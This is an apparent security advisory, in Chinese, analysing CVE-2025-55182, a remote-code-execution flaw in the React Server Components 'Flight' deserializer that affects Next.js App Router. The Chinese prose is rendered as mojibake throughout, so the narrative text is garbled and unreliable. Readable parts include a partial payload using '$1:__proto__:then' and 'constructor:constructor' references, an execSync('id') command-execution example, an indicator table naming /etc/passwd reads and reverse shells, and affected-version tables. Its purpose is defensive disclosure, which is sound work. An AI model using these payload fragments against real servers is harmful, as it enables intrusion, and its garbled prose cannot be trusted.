<p>å½“å‰çš„ç½‘ç»œå®‰å…¨å¨èƒæ€åŠ¿æå…¶ç´§å¼ ã€‚äºšé©¬é€Š AWS å¨èƒæƒ…æŠ¥å›¢é˜ŸåŠå¤šå®¶å…¨çƒå®‰å…¨æœºæ„å·²ç¡®è®¤ï¼Œä¸€äº›é«˜çº§æŒç»­æ€§å¨èƒç»„ç»‡ï¼Œåœ¨æ¼æ´æŠ«éœ²åçš„æ•°å°æ—¶å†…ä¾¿è¿…é€Ÿæ­¦å™¨åŒ–äº†è¯¥æ¼æ´ï¼Œå¹¶åœ¨å…¨çƒèŒƒå›´å†…å‘èµ·äº†é’ˆå¯¹æ€§çš„æ‰«æä¸æ”»å‡»æ´»åŠ¨ã€‚æ”»å‡»è€…çš„ç›®æ ‡ä¸ä»…é™äºå•çº¯çš„ç ´åï¼Œæ›´åŒ…æ‹¬äº‘ç¯å¢ƒå‡­è¯çªƒå–ã€åŠ å¯†è´§å¸æŒ–çŸ¿ä»¥åŠå»ºç«‹æŒä¹…åŒ–åé—¨ä»¥è¿›è¡Œåç»­çš„æ¨ªå‘ç§»åŠ¨ã€‚</p>
<p>æœ¬æŠ¥å‘Šæ—¨åœ¨ä¸ºé¦–å¸­ä¿¡æ¯å®‰å…¨å®˜ã€å®‰å…¨æ¶æ„å¸ˆåŠä¸€çº¿åº”æ€¥å“åº”äººå‘˜æä¾›ä¸€ä»½è¯¦å°½çš„è°ƒæŸ¥åˆ†æã€‚æŠ¥å‘Šå°†æ·±å…¥å‰–æ React Server Components çš„æ¶æ„è„†å¼±æ€§ï¼Œè§£æ„ "Flight" åè®®çš„åºåˆ—åŒ–æœºåˆ¶ï¼Œè¿˜åŸæ¼æ´åˆ©ç”¨çš„å®Œæ•´æ”»å‡»é“¾ï¼Œå¹¶åŸºäºç°æœ‰çš„å¨èƒæƒ…æŠ¥æ•°æ®ï¼Œæä¾›ä»ä»£ç ä¿®å¤ã€WAF ç­–ç•¥éƒ¨ç½²åˆ°å…¥ä¾µç—•è¿¹æ’æŸ¥çš„å…¨é“¾è·¯è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-1">2. æ¼æ´èƒŒæ™¯ä¸æŠ€æœ¯æ¶æ„æ·±å±‚è§£æ</h2>
<p>è¦ç†è§£ CVE-2025-55182 çš„æ¯ç­æ€§å½±å“ï¼Œå¿…é¡»é¦–å…ˆæ·±å…¥åˆ° React Server Components çš„è®¾è®¡å“²å­¦åŠå…¶èƒŒåçš„æŠ€æœ¯å®ç°ç»†èŠ‚ä¸­ã€‚React Server Components ä»£è¡¨äº†å‰ç«¯å¼€å‘èŒƒå¼çš„ä¸€æ¬¡é‡å¤§è½¬ç§»ï¼Œå®ƒæ¨¡ç³Šäº†å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„ä¼ ç»Ÿç•Œé™ï¼Œè€Œè¿™ç§ç•Œé™çš„æ¨¡ç³Šæ­£æ˜¯å®‰å…¨é£é™©æ»‹ç”Ÿçš„æ¸©åºŠã€‚</p>
<h3 data-id="heading-2">2.1 React Server Components çš„æ¶æ„æ¼”è¿›ä¸é£é™©é¢</h3>
<p>ä¼ ç»Ÿçš„ React åº”ç”¨ä¸»è¦ä¾èµ–å®¢æˆ·ç«¯æ¸²æŸ“ï¼ˆCSRï¼‰æˆ–æœåŠ¡ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰ã€‚åœ¨ SSR æ¨¡å¼ä¸‹ï¼ŒæœåŠ¡å™¨ä»…è´Ÿè´£ç”Ÿæˆåˆå§‹ HTML å­—ç¬¦ä¸²ï¼Œéšåçš„äº¤äº’é€»è¾‘ä»ç”±ä¸‹è½½åˆ°æµè§ˆå™¨çš„ JavaScript ä»£ç æ¥ç®¡ã€‚ç„¶è€Œï¼ŒReact Server Components å¼•å…¥äº†ä¸€ç§å…¨æ–°çš„ç»„ä»¶ç±»å‹â€”â€”ä»…åœ¨æœåŠ¡å™¨ç«¯è¿è¡Œçš„ç»„ä»¶ã€‚è¿™äº›ç»„ä»¶å¯ä»¥ç›´æ¥è®¿é—®åç«¯èµ„æºï¼ˆå¦‚æ•°æ®åº“ã€æ–‡ä»¶ç³»ç»Ÿã€å¾®æœåŠ¡æ¥å£ï¼‰ï¼Œè€Œæ— éœ€é€šè¿‡ API å±‚ã€‚</p>
<p>è¿™ç§æ¶æ„è™½ç„¶æå¤§åœ°ä¼˜åŒ–äº†æ€§èƒ½å¹¶ç®€åŒ–äº†æ•°æ®è·å–é€»è¾‘ï¼Œä½†ä¹Ÿå¼•å…¥äº†ä¸€ä¸ªå…³é”®çš„å®‰å…¨å‡è®¾ï¼šæœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿå®‰å…¨åœ°æ¥æ”¶ã€è§£æå¹¶å“åº”æ¥è‡ªå®¢æˆ·ç«¯çš„å¤æ‚æŒ‡ä»¤ã€‚ä¸ºäº†å®ç°å®¢æˆ·ç«¯ç»„ä»¶ä¸æœåŠ¡ç«¯ç»„ä»¶çš„æ— ç¼äº¤äº’ï¼ŒReact å›¢é˜Ÿè®¾è®¡äº†ä¸€å¥—å¤æ‚çš„åºåˆ—åŒ–åè®®ï¼Œå…è®¸ç»„ä»¶æ ‘ã€Props å’ŒçŠ¶æ€åœ¨ç½‘ç»œè¾¹ç•Œä¸ŠæµåŠ¨ã€‚</p>
<p>CVE-2025-55182 æš´éœ²äº†è¿™ä¸€è®¾è®¡ä¸­çš„è‡´å‘½å¼±ç‚¹ï¼šå½“ React è¯•å›¾åœ¨æœåŠ¡å™¨ç«¯â€œé‡ç»„â€æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®æµæ—¶ï¼Œå®ƒç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨è¾¹ç•Œæ£€æŸ¥ã€‚RSC çš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†æ€§èƒ½å’Œçµæ´»æ€§ï¼Œå…è®¸åºåˆ—åŒ–åŒ…å«å¤æ‚å¯¹è±¡å¼•ç”¨çš„æ•°æ®ç»“æ„ï¼Œè¿™ä¸ºååºåˆ—åŒ–æ”»å‡»æ‰“å¼€äº†å¤§é—¨ã€‚ä¸ä»¥å¾€ä»…å½±å“ç‰¹å®šåº“çš„æ¼æ´ä¸åŒï¼Œæ­¤æ¼æ´æ¤æ ¹äº React å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ ¸å¿ƒæœºåˆ¶ä¸­ï¼Œè¿™æ„å‘³ç€ä»»ä½•åŸºäº RSC æ„å»ºçš„åº”ç”¨ï¼ˆå¦‚ Next.js App Router åº”ç”¨ï¼‰éƒ½å†…åœ¨åœ°ç»§æ‰¿äº†è¿™ä¸€è„†å¼±æ€§ã€‚</p>
<h3 data-id="heading-3">2.2 "Flight" åè®®ï¼šåºåˆ—åŒ–æœºåˆ¶çš„é˜¿å–€ç‰æ–¯ä¹‹è¸µ</h3>
<p>React Server Components ä½¿ç”¨ä»£å·ä¸º "Flight" çš„ä¸“æœ‰åè®®è¿›è¡Œé€šä¿¡ã€‚è¿™æ˜¯ä¸€ç§åŸºäºæ–‡æœ¬çš„æµå¼åè®®ï¼Œæ—¨åœ¨é«˜æ•ˆåœ°æè¿° UI æ ‘ç»“æ„åŠå…¶ä¾èµ–çš„æ•°æ®ã€‚ä¸æ ‡å‡†çš„ JSON ä¸åŒï¼ŒFlight åè®®æ”¯æŒæ›´ä¸ºä¸°å¯Œçš„æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬ Promiseã€æ¨¡å—å¼•ç”¨ä»¥åŠå¤æ‚çš„å¯¹è±¡å›¾ã€‚</p>
<p>åœ¨ Flight åè®®ä¸­ï¼Œæ•°æ®è¢«åºåˆ—åŒ–ä¸ºä¸€ç³»åˆ—çš„â€œå—ï¼ˆChunksï¼‰â€æˆ–â€œè¡Œâ€ã€‚æ¯ä¸€è¡Œé€šå¸¸ä»£è¡¨ä¸€ä¸ªè¢«å¼•ç”¨çš„å¯¹è±¡æˆ–ç»„ä»¶ã€‚ä¸ºäº†å¤„ç†å¾ªç¯å¼•ç”¨å’Œå¼‚æ­¥åŠ è½½ï¼Œåè®®å…è®¸ä½¿ç”¨ç‰¹å®šçš„è¯­æ³•æ¥å¼•ç”¨å…¶ä»–è¡Œå®šä¹‰çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥åŒ…å«æŒ‡å‘å¦ä¸€ä¸ª ID ä¸º <code>$1</code> çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p>
<p>æ¼æ´çš„æ ¹æºåœ¨äº Flight åè®®ååºåˆ—åŒ–å™¨çš„å®ç°é€»è¾‘ã€‚å…·ä½“è€Œè¨€ï¼Œå­˜åœ¨äº <code>react-server-dom-webpack</code>ã€<code>react-server-dom-parcel</code> å’Œ <code>react-server-dom-turbopack</code> ç­‰æ ¸å¿ƒåŒ…ä¸­çš„è§£æä»£ç ï¼Œåœ¨å¤„ç†è¿™äº›å¼•ç”¨æ—¶è¿‡äºâ€œä¿¡ä»»â€å®¢æˆ·ç«¯è¾“å…¥ã€‚å½“è§£æå™¨é‡åˆ°ä¸€ä¸ªæ ‡è®°ä¸ºå¼•ç”¨çš„å­—æ®µæ—¶ï¼Œå®ƒä¼šå°è¯•è§£æè¯¥å¼•ç”¨ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ„é€ ä¸€ä¸ªæŒ‡å‘æœåŠ¡å™¨å†…éƒ¨æ•æ„Ÿå±æ€§ï¼ˆå¦‚åŸå‹é“¾ä¸Šçš„å±æ€§ï¼‰çš„å¼•ç”¨ï¼Œæˆ–è€…æ„é€ ä¸€ä¸ªä¼ªè£…æˆå†…éƒ¨ç»“æ„ï¼ˆå¦‚ Promiseï¼‰çš„æ¶æ„å¯¹è±¡ï¼Œè§£æå™¨å°±ä¼šåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œè¿™äº›æ¶æ„é€»è¾‘ã€‚</p>
<p>è¿™ç§æœºåˆ¶ä¸Šçš„ç¼ºé™·ä½¿å¾— Flight åè®®æˆä¸ºäº†æ”»å‡»è€…åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„ç†æƒ³è½½ä½“ã€‚ä¸ Java æˆ– PHP ä¸­ç»å…¸çš„ååºåˆ—åŒ–æ¼æ´ç±»ä¼¼ï¼Œæ”»å‡»è€…ä¸ä»…ä»…æ˜¯å‘é€æ•°æ®ï¼Œè€Œæ˜¯åœ¨å‘é€â€œæŒ‡ä»¤â€ã€‚å½“æœåŠ¡å™¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œå®é™…ä¸Šæ˜¯åœ¨æ‰§è¡Œæ”»å‡»è€…é¢„å®šä¹‰çš„ä»£ç è·¯å¾„ã€‚</p>
<h2 data-id="heading-4">3. æ¼æ´æœºç†ä¸æ”»å‡»é“¾è¯¦ç»†å¤ç›˜</h2>
<p>CVE-2025-55182 çš„åˆ©ç”¨è¿‡ç¨‹æ˜¯ä¸€ä¸ªå…¸å‹çš„é€»è¾‘æ¼æ´åˆ©ç”¨æ¡ˆä¾‹ï¼Œå®ƒç»“åˆäº†å¯¹è±¡ä¼ªé€ ã€åŸå‹é“¾æ±¡æŸ“å’Œä¸å¯ä¿¡ä»£ç æ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯å¯¹æ”»å‡»é“¾çš„æ·±åº¦æŠ€æœ¯å¤ç›˜ã€‚</p>
<h3 data-id="heading-5">3.1 æ”»å‡»å‘é‡ï¼šä¼ªé€  "Thenable" å¯¹è±¡ä¸åŸå‹é“¾åŠ«æŒ</h3>
<p>æ”»å‡»çš„æ ¸å¿ƒåœ¨äºæ“çºµ Flight åè®®å¯¹ Promise çš„å¤„ç†æ–¹å¼ã€‚åœ¨ JavaScript ç”Ÿæ€ä¸­ï¼Œä»»ä½•å…·æœ‰ <code>.then()</code> æ–¹æ³•çš„å¯¹è±¡éƒ½å¯ä»¥è¢«è§†ä¸º Promiseï¼ˆå³ "Thenable" å¯¹è±¡ï¼‰ã€‚React çš„å†…éƒ¨æœºåˆ¶åœ¨å¤„ç†å¼‚æ­¥æ•°æ®æµæ—¶ï¼Œä¼šè‡ªåŠ¨æ£€æŸ¥å¯¹è±¡æ˜¯å¦ä¸º Thenableï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¼šå°è¯•è°ƒç”¨å…¶ <code>.then()</code> æ–¹æ³•ä»¥ç­‰å¾…ç»“æœã€‚</p>
<p>æ”»å‡»è€…æ„é€ çš„æ¶æ„ Payload åŒ…å«ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„ JSON å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ¨¡ä»¿äº† React å†…éƒ¨ <code>Chunk</code> ç±»çš„ç»“æ„ï¼Œä½†å®é™…ä¸Šæ˜¯ä¸€ä¸ªé™·é˜±ã€‚</p>
<p><strong>æ”»å‡»æ­¥éª¤è¯¦è§£ï¼š</strong></p>
<ol>
<li>æ„é€ ä¼ªé€  Chunkï¼šæ”»å‡»è€…å‘é€ä¸€ä¸ªåŒ…å«ç‰¹å®šå­—æ®µï¼ˆå¦‚ <code>status</code>ã€<code>value</code> ç­‰ï¼‰çš„ JSON å¯¹è±¡ï¼Œä½¿å…¶çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªåˆæ³•çš„ React å†…éƒ¨æ•°æ®å—ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œæ”»å‡»è€…åœ¨è¿™ä¸ªå¯¹è±¡ä¸­å®šä¹‰äº†ä¸€ä¸ª <code>then</code> å±æ€§ã€‚
æ ¹æ®å…¬å¼€çš„ PoC åˆ†æï¼ŒPayload ç»“æ„å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
<pre><code class="hljs language-JSON" lang="JSON"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$1:__proto__:then"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"resolved_model"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span>
<span class="hljs-punctuation">}</span>
</code></pre>
è¿™é‡Œï¼Œ<code>then</code> å±æ€§å¹¶æ²¡æœ‰æŒ‡å‘ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯åˆ©ç”¨äº† Flight åè®®çš„å¼•ç”¨è¯­æ³•ï¼ˆ<code>$ReferenceId:Path</code>ï¼‰ï¼ŒæŒ‡å‘äº†åŸå‹é“¾ä¸Šçš„ <code>then</code> æ–¹æ³•ã€‚</li>
<li>è§¦å‘ååºåˆ—åŒ–é€»è¾‘ï¼šå½“ React æœåŠ¡å™¨æ¥æ”¶åˆ°æ­¤ Payload å¹¶è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå®ƒä¼šè¯†åˆ«å‡ºè¿™æ˜¯ä¸€ä¸ªâ€œå¼‚æ­¥â€ä¾èµ–ï¼Œå¹¶å°è¯•é€šè¿‡è°ƒç”¨ <code>.then()</code> æ¥è§£æå®ƒã€‚ç”±äºæ”»å‡»è€…é€šè¿‡å¼•ç”¨è¯­æ³•æ“çºµäº† <code>.then</code> çš„æŒ‡å‘ï¼Œè¿™ä¸€è°ƒç”¨å®é™…ä¸Šå°†æ§åˆ¶æƒäº¤ç»™äº†æ”»å‡»è€…æŒ‡å®šçš„ä»£ç è·¯å¾„ã€‚</li>
<li>åŸå‹é“¾éå†ï¼šæ”»å‡»è€…åˆ©ç”¨ Flight åè®®å…è®¸å±æ€§è®¿é—®çš„ç‰¹æ€§ï¼ˆå¦‚ <code>Reference:Key</code>ï¼‰ï¼Œé€šè¿‡æ„é€ ç±»ä¼¼ <code>$1:constructor:constructor</code> çš„å¼•ç”¨è·¯å¾„ï¼ŒæˆåŠŸè·³å‡ºäº†å½“å‰æ¨¡å—çš„ä¸Šä¸‹æ–‡ã€‚
<ul>
<li><code>$1</code>ï¼šå¼•ç”¨æŸä¸ªåŸºç¡€å¯¹è±¡ã€‚</li>
<li><code>.constructor</code>ï¼šè®¿é—®è¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</li>
<li><code>.constructor</code>ï¼ˆå†æ¬¡ï¼‰ï¼šè®¿é—®æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°ï¼Œåœ¨ JavaScript ä¸­ï¼Œè¿™é€šå¸¸ä¼šè¿”å›å…¨å±€çš„ <code>Function</code> æ„é€ å™¨ã€‚</li>
</ul>
</li>
<li>ä»»æ„ä»£ç æ‰§è¡Œï¼šä¸€æ—¦è·å–äº†å…¨å±€ <code>Function</code> æ„é€ å™¨çš„å¼•ç”¨ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨å®ƒæ¥åŠ¨æ€ç”Ÿæˆå¹¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚åœ¨ Payload ä¸­ï¼Œæ”»å‡»è€…ä¼šå°†æ¶æ„æŒ‡ä»¤ï¼ˆå¦‚ <code>process.mainModule.require('child_process').execSync('id')</code>ï¼‰ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ªæ„é€ å‡ºçš„å‡½æ•°ï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li>
</ol>
<h3 data-id="heading-6">3.2 ä¸ºä»€ä¹ˆ Next.js é»˜è®¤é…ç½®å—å½±å“ï¼Ÿ</h3>
<p>Next.jsï¼ˆç‰¹åˆ«æ˜¯ä½¿ç”¨ App Router çš„ç‰ˆæœ¬ï¼‰æ·±åº¦é›†æˆäº† React Server Componentsã€‚åœ¨é»˜è®¤é…ç½®ä¸‹ï¼ŒNext.js ä¼šè‡ªåŠ¨å¤„ç†å‘é€åˆ° Server Components çš„ POST è¯·æ±‚ã€‚å³ä½¿å¼€å‘è€…æ²¡æœ‰æ˜¾å¼å®šä¹‰ Server Actionsï¼Œåªè¦åº”ç”¨ä½¿ç”¨äº† App Routerï¼Œåº•å±‚çš„ RSC åŸºç¡€è®¾æ–½ï¼ˆå³ <code>react-server-dom-*</code> åŒ…ï¼‰å°±å·²ç»å¤„äºæ´»è·ƒçŠ¶æ€å¹¶ç›‘å¬ç½‘ç»œè¯·æ±‚ã€‚</p>
<p>è¿™æ„å‘³ç€æ”»å‡»è€…ä¸éœ€è¦å¯»æ‰¾ç‰¹å®šçš„ã€å¼€å‘è€…ç¼–å†™çš„æœ‰æ¼æ´çš„ä»£ç ç«¯ç‚¹ã€‚ä»–ä»¬åªéœ€è¦å‘åº”ç”¨çš„ä»»æ„é¡µé¢è·¯ç”±å‘é€ç‰¹åˆ¶çš„ HTTP è¯·æ±‚ï¼Œå°±èƒ½è§¦è¾¾åº•å±‚çš„è„†å¼±ä»£ç ã€‚è¿™ç§â€œé»˜è®¤ä¸å®‰å…¨â€çš„ç‰¹æ€§æ˜¯ CVE-2025-55182 å¦‚æ­¤å±é™©çš„æ ¸å¿ƒåŸå› ä¹‹ä¸€ã€‚</p>
<h3 data-id="heading-7">3.3 æ¼æ´åˆ©ç”¨çš„å…ˆå†³æ¡ä»¶ä¸é™åˆ¶</h3>
<p>è™½ç„¶è¯¥æ¼æ´è¢«ç§°ä¸ºâ€œå®Œç¾åˆ©ç”¨â€ï¼Œä½†ä»æŠ€æœ¯è§’åº¦çœ‹ï¼Œä»å­˜åœ¨æå°‘çš„é™åˆ¶æ¡ä»¶ï¼š</p>
<ul>
<li><strong>ç½‘ç»œå¯è¾¾æ€§ï¼š</strong> æ”»å‡»è€…å¿…é¡»èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°æ‰˜ç®¡ RSC çš„ç«¯ç‚¹ã€‚å¯¹äºé¢å‘å…¬ç½‘çš„ Web åº”ç”¨ï¼Œè¿™é€šå¸¸ä¸æ˜¯éšœç¢ã€‚</li>
<li><strong>ç‰ˆæœ¬åŒ¹é…ï¼š</strong> ç›®æ ‡å¿…é¡»è¿è¡Œåœ¨å—å½±å“çš„ React æˆ– Next.js ç‰ˆæœ¬ä¸Šï¼ˆè¯¦è§åæ–‡å—å½±å“èŒƒå›´éƒ¨åˆ†ï¼‰ã€‚</li>
<li><strong>ç¯å¢ƒå› ç´ ï¼š</strong> è™½ç„¶ Payload å¯ä»¥æ‰§è¡Œä»»æ„ JS ä»£ç ï¼Œä½†æœ€ç»ˆèƒ½å¦è·å¾—ç³»ç»Ÿ Root æƒé™æˆ–æ¨ªå‘ç§»åŠ¨ï¼Œå–å†³äº Node.js è¿›ç¨‹æœ¬èº«çš„æƒé™é…ç½®åŠå®¹å™¨ç¯å¢ƒçš„å®‰å…¨åŠ å›ºç¨‹åº¦ã€‚</li>
</ul>
<h2 data-id="heading-8">4. å…¨çƒå¨èƒæƒ…æŠ¥ä¸æ”»å‡»æ€åŠ¿åˆ†æ</h2>
<p>åœ¨ CVE-2025-55182 æŠ«éœ²åçš„æçŸ­æ—¶é—´å†…ï¼Œå…¨çƒç½‘ç»œå®‰å…¨æ€åŠ¿å‘ç”Ÿäº†å‰§çƒˆå˜åŒ–ã€‚è¯¥æ¼æ´çš„é«˜å±ç‰¹æ€§ä½¿å…¶è¿…é€Ÿæˆä¸ºå„å¤§é»‘å®¢ç»„ç»‡çš„é¦–é€‰æ­¦å™¨ã€‚</p>
<h3 data-id="heading-9">4.1 åœ¨é‡æ”»å‡»ç‰¹å¾ä¸æŒ‡æ ‡</h3>
<p>å®‰å…¨ç ”ç©¶äººå‘˜é€šè¿‡èœœç½ç³»ç»Ÿï¼ˆå¦‚ AWS MadPotï¼‰æ•è·äº†å¤§é‡é’ˆå¯¹ CVE-2025-55182 çš„æ”»å‡»æµé‡ã€‚ä»¥ä¸‹æ˜¯è¯†åˆ«æ”»å‡»æ´»åŠ¨çš„å…³é”®ç‰¹å¾ï¼š</p>























































<table><thead><tr><th align="left">æ”»å‡»é˜¶æ®µ</th><th align="left">æŠ€æœ¯æŒ‡æ ‡</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><strong>ä¾¦å¯Ÿæ‰«æ</strong></td><td align="left">HTTP POST è¯·æ±‚</td><td align="left">é’ˆå¯¹æ ¹è·¯å¾„æˆ–ç‰¹å®š RSC ç«¯ç‚¹çš„å¤§é‡ POST è¯·æ±‚ã€‚</td></tr><tr><td align="left"><strong>Payload ç‰¹å¾</strong></td><td align="left"><code>$1:constructor</code></td><td align="left">è¯·æ±‚ä½“ä¸­åŒ…å« Flight åè®®ç‰¹å®šçš„å¼•ç”¨è¯­æ³•ï¼Œè¯•å›¾è®¿é—®æ„é€ å‡½æ•°ã€‚</td></tr><tr><td align="left"><strong>Payload ç‰¹å¾</strong></td><td align="left"><code>process.mainModule</code></td><td align="left">å°è¯•è°ƒç”¨ Node.js æ ¸å¿ƒæ¨¡å—ï¼Œé€šå¸¸ç”¨äºåŠ è½½ <code>child_process</code>ã€‚</td></tr><tr><td align="left"><strong>Payload ç‰¹å¾</strong></td><td align="left"><code>_formData</code></td><td align="left">åˆ©ç”¨ FormData ç»“æ„ä¼ªé€ å†…éƒ¨å¯¹è±¡å±æ€§ã€‚</td></tr><tr><td align="left"><strong>åç»­è¡Œä¸º</strong></td><td align="left">å‘½ä»¤æ‰§è¡Œï¼š<code>whoami</code>, <code>id</code>, <code>uname</code></td><td align="left">å…¸å‹çš„åˆå§‹æƒé™ç¡®è®¤å‘½ä»¤ã€‚</td></tr><tr><td align="left"><strong>åç»­è¡Œä¸º</strong></td><td align="left">æ–‡ä»¶æ“ä½œï¼š<code>/tmp/pwned.txt</code></td><td align="left">æ”»å‡»è€…å¸¸åœ¨ <code>/tmp</code> ç›®å½•å†™å…¥æ ‡è®°æ–‡ä»¶ä»¥éªŒè¯å†™å…¥æƒé™ã€‚</td></tr><tr><td align="left"><strong>åç»­è¡Œä¸º</strong></td><td align="left">æ–‡ä»¶è¯»å–ï¼š<code>/etc/passwd</code></td><td align="left">å°è¯•è¯»å–ç³»ç»Ÿç”¨æˆ·åˆ—è¡¨ã€‚</td></tr><tr><td align="left"><strong>ç½‘ç»œè¡Œä¸º</strong></td><td align="left">å¼‚å¸¸å‡ºç«™è¿æ¥</td><td align="left">æœåŠ¡å™¨å‘æœªçŸ¥ IP å‘èµ·è¿æ¥ï¼Œå¯èƒ½æ˜¯åå¼¹ Shell æˆ–ä¸‹è½½ç¬¬äºŒé˜¶æ®µ Payloadã€‚</td></tr><tr><td align="left"><strong>æ—¥å¿—å¼‚å¸¸</strong></td><td align="left">HTTP 500 é”™è¯¯æ¿€å¢</td><td align="left">å¤±è´¥çš„åˆ©ç”¨å°è¯•å¾€å¾€ä¼šå¯¼è‡´æœåŠ¡å™¨ç«¯æŠ›å‡ºæœªå¤„ç†çš„å¼‚å¸¸ï¼Œå¯¼è‡´ 500 é”™è¯¯ç‡æ˜¾è‘—ä¸Šå‡ã€‚</td></tr></tbody></table>
<h3 data-id="heading-10">4.2 è‡ªåŠ¨åŒ–å·¥å…·çš„æ³›æ»¥</h3>
<p>GitHub ç­‰å¹³å°ä¸Šå·²å‡ºç°äº†å¤šä¸ªé’ˆå¯¹è¯¥æ¼æ´çš„æ‰«æå™¨å’Œæ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰ä»£ç ï¼Œå¦‚ <code>react2shell-scanner</code>ã€‚è™½ç„¶è¿™äº›å·¥å…·åˆè¡·æ˜¯ä¸ºäº†å¸®åŠ©é˜²å¾¡è€…è‡ªæŸ¥ï¼Œä½†å®ƒä»¬æ— ç–‘ä¹Ÿé™ä½äº†æ”»å‡»è€…çš„æŠ€æœ¯é—¨æ§›ï¼Œå¯¼è‡´äº†å¤§é‡â€œè„šæœ¬å°å­â€å¼çš„æœºä¼šä¸»ä¹‰æ”»å‡»ã€‚æ”»å‡»è€…æ­£åœ¨ä½¿ç”¨è¿™äº›å·¥å…·å¯¹å…¨ç½‘ IPv4 åœ°å€æ®µè¿›è¡Œå¤§è§„æ¨¡æ‰«å°„ï¼Œå¯»æ‰¾æœªä¿®è¡¥çš„æœåŠ¡å™¨ã€‚</p>
<h2 data-id="heading-11">5. å—å½±å“ç”Ÿæ€ç³»ç»Ÿä¸ç‰ˆæœ¬å…¨æ™¯</h2>
<p>CVE-2025-55182 çš„å½±å“èŒƒå›´ä¹‹å¹¿ï¼Œæ¶µç›–äº†ä»åº•å±‚åº“åˆ°ä¸Šå±‚æ¡†æ¶çš„æ•´ä¸ª React æŠ€æœ¯æ ˆã€‚ç”±äºç°ä»£å‰ç«¯å¼€å‘çš„æ¨¡å—åŒ–ç‰¹æ€§ï¼Œè®¸å¤šå¼€å‘è€…å¯èƒ½å¹¶æœªæ„è¯†åˆ°è‡ªå·±æ­£åœ¨ä½¿ç”¨å—å½±å“çš„ç»„ä»¶ã€‚</p>
<h3 data-id="heading-12">5.1 æ ¸å¿ƒå—å½±å“ç»„ä»¶</h3>
<p>æ¼æ´ç›´æ¥å­˜åœ¨äºä»¥ä¸‹ React Server DOM åŒ…ä¸­ï¼š</p>
<ul>
<li><code>react-server-dom-webpack</code></li>
<li><code>react-server-dom-parcel</code></li>
<li><code>react-server-dom-turbopack</code></li>
</ul>
<p><strong>å—å½±å“ç‰ˆæœ¬èŒƒå›´ï¼š</strong></p>
<ul>
<li>19.0.0</li>
<li>19.1.0, 19.1.1</li>
<li>19.2.0</li>
</ul>
<h3 data-id="heading-13">5.2 Next.js å—å½±å“ç‰ˆæœ¬çŸ©é˜µ</h3>
<p>Next.js æ˜¯å—å½±å“æœ€ä¸¥é‡çš„ä¸‹æ¸¸æ¡†æ¶ï¼Œå› ä¸ºå®ƒåœ¨ App Router ä¸­é»˜è®¤ä½¿ç”¨äº†ä¸Šè¿°åŒ…ã€‚æ­¤å‰ Next.js å‘å¸ƒçš„ CVE-2025-66478 å·²è¢«ç¡®è®¤ä¸º CVE-2025-55182 çš„é‡å¤é¡¹ã€‚</p>
<p><strong>ä»¥ä¸‹ Next.js ç‰ˆæœ¬ï¼ˆä½¿ç”¨ App Routerï¼‰å‡å—å½±å“ï¼š</strong></p>









































<table><thead><tr><th align="left">ä¸»è¦ç‰ˆæœ¬çº¿</th><th align="left">å—å½±å“ç‰ˆæœ¬åŒºé—´</th></tr></thead><tbody><tr><td align="left"><strong>Next.js 15.0</strong></td><td align="left">15.0.0 è‡³ 15.0.4</td></tr><tr><td align="left"><strong>Next.js 15.1</strong></td><td align="left">15.1.0 è‡³ 15.1.8</td></tr><tr><td align="left"><strong>Next.js 15.2</strong></td><td align="left">15.2.0 è‡³ 15.2.5</td></tr><tr><td align="left"><strong>Next.js 15.3</strong></td><td align="left">15.3.0 è‡³ 15.3.5</td></tr><tr><td align="left"><strong>Next.js 15.4</strong></td><td align="left">15.4.0 è‡³ 15.4.7</td></tr><tr><td align="left"><strong>Next.js 15.5</strong></td><td align="left">15.5.0 è‡³ 15.5.6</td></tr><tr><td align="left"><strong>Next.js 16.0</strong></td><td align="left">16.0.0 è‡³ 16.0.6</td></tr><tr><td align="left"><strong>Next.js Canary</strong></td><td align="left">14.3.0-canary.77 åŠä¹‹åçš„ Canary ç‰ˆæœ¬</td></tr></tbody></table>
<p><strong>æ³¨æ„ï¼š</strong> Next.js 14.xï¼ˆç¨³å®šç‰ˆï¼‰ã€Next.js 13.x ä»¥åŠä»…ä½¿ç”¨ Pages Router çš„åº”ç”¨<strong>ä¸å—å½±å“</strong>ã€‚</p>
